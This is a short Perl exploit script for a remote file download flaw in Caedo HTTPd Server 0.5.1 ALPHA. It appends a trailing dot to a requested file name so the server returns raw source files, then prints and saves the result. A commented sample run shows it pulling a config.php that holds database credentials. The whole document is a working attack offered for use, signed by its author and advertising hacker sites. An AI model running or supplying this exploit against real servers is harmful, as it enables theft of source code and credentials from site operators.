#!/usr/bin/perl
use LWP::Simple;
#Caedo HTTPd Server v 0.5.1 ALPHA Remote File Download Exploit
#Author : Zer0 Thunder
 
if (@ARGV < 3) {
    print("\r\n");
    print("Caedo HTTPd Server Remote File Download Exploit\r\n");
    print("Vuln Found and Exploited by Zer0 Thunder\r\n");
    print("***************************************************");
    print("Usage: " .$0. " [ host]  [ port ] [path] [ file ]\r\n");
    print("Example: " .$0. " hostingserver.com 80 / config.php\r\n\r\n");
    exit(1);
} else {
         print("Caedo HTTPd Server Remote File Download Exploit\r\n");
   	 print("Vuln Found and Exploited by Zer0 Thunder\r\n");
    	 print("***************************************************");

    ($target, $port, $path, $file) = @ARGV;
    $result= get("http://" .$target. ":" .$port. "/" .$path. "/".$file. ".");
        print("\nFile Content:\r\n\r\n");
    print($result. "\r\n");
    open FILE, ">$file";
    print FILE $result;
    close FILE;
    print " File Saved : $file \n\n";
	print "---------------------------------------------\n";
   	print "site : zt-security.com - colombohackers.com\n";
}
#zero@zero-desktop:~/Desktop/exploit$ perl caedo.pl 192.168.1.101 8080 test config.php
#Caedo HTTPd Server Remote File Download Exploit
#Vuln Found and Exploited by Zer0 Thunder
#***************************************************
#File Content:
#
#<?PHP
#Config File
#$db_host = "localhost";
#$db_name = "test";
#$db_user = "test"
#$db_pass = "y0usuck";
#?>
#
# File Saved : config.php 
#
#---------------------------------------------
#site : zt-security.com - colombohackers.com
#zero@zero-desktop:~/Desktop/exploit$ 